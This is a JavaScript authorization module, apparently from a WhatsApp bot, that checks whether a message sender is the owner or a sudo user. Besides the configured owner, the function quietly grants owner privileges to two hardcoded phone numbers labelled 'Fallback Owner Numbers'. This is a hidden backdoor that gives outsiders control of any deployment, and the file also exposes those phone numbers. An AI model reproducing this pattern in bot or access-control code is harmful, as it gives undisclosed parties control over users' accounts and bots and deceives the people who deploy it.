const settings = require('../settings');
const { isSudo } = require('./index');

async function isOwnerOrSudo(senderId, sock = null, chatId = null) {
    if (!senderId) return false;

    const rawOwner = settings.ownerNumber || '';
    const ownerDigits = rawOwner.split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
    const senderDigits = senderId.split(':')[0].split('@')[0].replace(/[^0-9]/g, '');

    // 1. Direct Owner Match
    if (ownerDigits && senderDigits === ownerDigits) {
        return true;
    }

    // 2. Fallback Owner Numbers
    const trustedOwners = ['923097498072', '923462809972', ownerDigits];
    if (trustedOwners.some(num => num && senderDigits === num)) {
        return true;
    }

    // 3. Bot Account Match (Self execution)
    if (sock?.user) {
        const botDigits = (sock.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const botLidDigits = (sock.user.lid || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');

        if (senderDigits === botDigits || (botLidDigits && senderDigits === botLidDigits)) {
            return true;
        }
    }

    // 4. Sudo Database Check
    try {
        return await isSudo(senderId);
    } catch (e) {
        return false;
    }
}

module.exports = isOwnerOrSudo;